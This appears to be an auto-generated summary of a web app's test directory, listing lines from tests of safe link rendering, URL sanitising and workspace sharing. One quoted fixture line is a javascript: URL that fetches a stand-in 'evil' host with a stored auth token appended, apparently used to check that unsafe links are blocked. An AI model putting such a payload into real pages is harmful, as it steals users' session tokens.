#   Tests  

## Overview
Component package providing implementation for `apps/suites/vitruvian-tabs/web/__tests__`.

## Interface
- Internal implementation components

## Invariants
- None

## Side Effects
- [SpaceView.test.tsx:49]: `it("renders a safe http(s) resource as a real link", () => {`
- [SpaceView.test.tsx:77]: `url: "javascript:fetch('//evil/'+localStorage.vitruvian_tabs_token)",`
- [safe-href.test.ts:26]: `it("allows absolute http and https URLs", () => {`
- [safe-href.test.ts:30]: `expect(safeHref("http://example.com")).toBe("http://example.com");`
- [sharing.test.ts:32]: `global.fetch = mockFetch as unknown as typeof fetch;`
- [sharing.test.ts:52]: `expect(url).toBe("http://localhost:8080/api/v1/workspaces/ws_1");`
- [sharing.test.ts:78]: `expect(url).toBe("http://localhost:8080/api/v1/workspaces/ws_1");`
- [workspaces.test.tsx:120]: `it("should filter workspaces based on search query", () => {`

## Verification
- Run: `bazel test //apps/suites/vitruvian-tabs/web/__tests__/...`
